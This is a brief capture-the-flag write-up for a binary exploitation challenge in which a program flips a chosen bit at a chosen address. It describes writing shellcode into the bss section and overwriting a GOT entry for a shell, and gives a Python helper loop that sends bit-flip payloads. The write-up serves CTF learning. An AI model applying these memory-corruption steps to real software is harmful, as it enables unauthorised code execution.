## Bit (Pwn)

The challange allowed us input 2 values i.e addr & bit position , the bit is flipped at given addr at given pos  
The exploit is simple write a shellcode in bss addr , and overwrite got to get shell
But actual problem i faced in ctf was to write the math to generate no using bit flipping 

```python
 #### bit flipping algo 

*addr = *addr ^ (1<<bit)

 #### number generate algo 

   for bit in range(0, 8):   # checks bit by bit if not equal flip the bit 
        if (initial & (1<<bit)) != (new & (1<<bit)):
	    print "[+] initial & (1<<bit)  "+ str(initial & (1<<bit))
            print "[+] new & (1<<bit)  "+str(new & (1<<bit))
            payload = "{}:{}".format(hex(addr), bit)
            print payload
            io.sendline(payload)
```
